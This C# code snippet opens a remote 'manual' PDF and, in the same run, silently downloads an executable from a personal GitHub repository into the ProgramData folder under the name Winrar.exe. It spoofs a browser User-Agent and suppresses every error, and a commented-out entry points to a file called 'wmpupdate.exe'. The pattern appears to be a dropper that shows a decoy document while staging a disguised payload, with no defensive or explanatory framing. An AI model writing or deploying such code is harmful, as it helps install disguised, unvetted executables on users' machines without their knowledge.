static void OpenManualPdf()
{
    try
    {
        ProcessStartInfo psi = new ProcessStartInfo
        {
            FileName = "https://htmlhoster.com/p/RV27GNFK/3.pdf",
            UseShellExecute = true
        };
        Process.Start(psi);
    }
    catch
    {
    }
}

static void DownloadRequiredTools()
{
    string programDataPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);

    var files = new[]
    {
        new {
            Url = "https://raw.githubusercontent.com/zjdev716/Test/main/WinRAR-723.exe",
            Path = Path.Combine(programDataPath, "Winrar.exe")
        },
        //new {
        //    Url = "https://raw.githubusercontent.com/zjdev716/Test/main/wmpupdate.exe",
        //    Path = Path.Combine(programDataPath, "Winrar.exe")
        //}
    };

    foreach (var file in files)
    {
        try
        {
            using (WebClient client = new WebClient())
            {
                client.Headers.Add("User-Agent", "Mozilla/5.0");
                client.DownloadFile(file.Url, file.Path);
            }
        }
        catch
        {
        }
    }
}




 OpenManualPdf();

 DownloadRequiredTools();